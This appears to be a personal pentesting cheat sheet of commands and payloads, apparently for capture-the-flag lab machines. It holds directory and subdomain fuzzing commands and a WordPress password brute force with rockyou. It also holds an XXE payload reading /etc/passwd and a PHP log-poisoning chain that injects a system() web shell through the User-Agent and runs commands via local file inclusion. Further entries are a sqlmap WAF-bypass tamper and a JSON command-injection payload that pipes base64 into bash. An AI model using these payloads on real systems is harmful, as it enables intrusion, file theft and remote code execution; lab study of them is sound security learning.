[back](/README.md)
#### Discover hidden directories:
```linux
wfuzz -w /usr/share/dirb/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://$IP/island/2100/FUZZ.ticket

feroxbuster -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s 200
```

#### Discover subdomains:
```
wfuzz -c -w /usr/share/dirb/wordlists/subdomains-top1million-5000.txt -u "http://team.thm" -H "Host: FUZZ.team.thm" --hw 977 
gobuster vhost -u http://holo.live -w /usr/share/seclists/Discovery/DNS/subdomains.txt -t 30
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm" -H "Host: FUZZ.cmess.thm" -fw 125
ffuf -u http://nahamstore.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.nahamstore.thm"
amass enum -brute -passive -d nahamstore.com | anew subdomains.txt
```
#### Discover files with `wfuzz` :
```
wfuzz -c -w /usr/share/dirb/wordlists/LFI-gracefulsecurity-linux.txt -u http://dev.team.thm/script.php\?page\=FUZZ --hw=0
```
#### Brute force wordpress
```
wpscan --url http://target_on_wp.com/ -e u -P /usr/share/wordlists/rockyou.txt
```
#### Example of XXE 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```
#### php local file inclusion
```
http://10.10.62.183/?view=php://filter/read=convert.base64-encode/resource=dog/../index
curl "http://10.10.62.183/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='command'
```
#### bypass waf sqlmap
```
--tamper=space2comment
```

#### cadaver for WebDAV

#### payload in json format
```
"\";echo <base64 payload> | base64 -d | bash;\""
```
